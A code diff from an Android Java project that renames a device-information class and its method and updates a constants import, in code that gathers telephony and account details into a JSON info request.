@@ -25,26 +25,26 @@ import android.util.DisplayMetrics;
 import android.view.WindowManager;
 
 import com.inet.android.certificate.R;
-import com.inet.android.request.ConstantRequest;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
-public class GetInfo {
+public class DeviceInformation {
 	private static Context mContext;
 	private static SharedPreferences sp;
 	private static TelephonyManager telephonyManager;
 	private static int networkType;
 	private TelephonyInfo telephonyInfo;
-	private String LOG_TAG = GetInfo.class.getSimpleName().toString();
+	private String LOG_TAG = DeviceInformation.class.getSimpleName().toString();
 	private JSONObject info;
 	private Resources path;
 
-	public GetInfo(Context mContext) {
-		GetInfo.mContext = mContext;
+	public DeviceInformation(Context mContext) {
+		DeviceInformation.mContext = mContext;
 	}
 
-	public void startGetInfo() {
+	public void getInfo() {
 		path = mContext.getApplicationContext().getResources();
 
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
@@ -95,7 +95,7 @@ public class GetInfo {
 			getAccaunt();
 
 			object.put("time", ConvertDate.logTime());
-			object.put("type", ConstantRequest.TYPE_INFO_REQUEST);
+			object.put("type", ConstantValue.TYPE_INFO_REQUEST);
 			object.put("info", info);
 			// object.put("hardware", value);
 			// object.put("accaunt", value);
